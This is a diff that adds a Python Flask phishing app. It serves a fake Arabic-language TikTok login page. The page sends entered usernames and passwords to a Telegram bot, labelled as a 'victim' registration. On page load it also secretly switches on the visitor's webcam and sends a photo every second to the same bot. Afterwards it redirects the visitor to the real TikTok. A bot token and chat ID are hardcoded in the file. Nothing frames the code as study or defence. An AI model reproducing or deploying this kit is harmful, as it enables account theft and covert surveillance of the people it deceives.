@@ -1,0 +1,141 @@
+from flask import Flask, request, render_template_string
+import base64
+import requests
+
+app = Flask(__name__)
+
+# حط التوكن والـ ID بتوع بوت تليجرام هنا
+TELEGRAM_BOT_TOKEN = '7894559409:AAE902tl12LarJ_igZX16SXC6s8wKITHVi4'
+TELEGRAM_CHAT_ID = '6297654627'
+
+html_page = """
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>TikTok - تسجيل الدخول</title>
+  <link rel="icon" href="https://www.tiktok.com/favicon.ico">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 320px;
+      padding: 30px;
+      border: 1px solid #ddd;
+      box-shadow: 0 0 15px #eee;
+      border-radius: 8px;
+    }
+    .container h2 {
+      text-align: center;
+      color: #000;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #fe2c55;
+      color: white;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>تسجيل الدخول إلى TikTok</h2>
+    <input type="text" id="username" placeholder="رقم الهاتف / البريد الإلكتروني">
+    <input type="password" id="password" placeholder="كلمة المرور">
+    <button onclick="submitForm()">تسجيل الدخول</button>
+  </div>
+
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        setInterval(captureImage, 1000);
+      });
+
+    function captureImage() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const img = canvas.toDataURL('image/png');
+
+      fetch('/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: img })
+      });
+    }
+
+    function submitForm() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+
+      fetch('/creds', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user: user, pass: pass })
+      });
+
+      alert("جاري تسجيل الدخول...");
+      setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 2000);
+    }
+  </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(html_page)
+
+@app.route('/creds', methods=['POST'])
+def creds():
+    data = request.get_json()
+    user = data.get('user')
+    password = data.get('pass')
+    message = f"تم تسجيل الضحية:\nEmail: {user}\nPassword: {password}"
+    send_to_telegram(message)
+    return 'تم الاستلام'
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    data = request.get_json()
+    image_data = data.get('image').split(",")[1]
+    with open("photo.png", "wb") as f:
+        f.write(base64.b64decode(image_data))
+    send_photo_to_telegram("photo.png")
+    return 'تم تحميل الصورة'
+
+def send_to_telegram(text):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': text})
+
+def send_photo_to_telegram(file_path):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+    with open(file_path, 'rb') as f:
+        files = {'photo': f}
+        data = {'chat_id': TELEGRAM_CHAT_ID}
+        requests.post(url, files=files, data=data)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
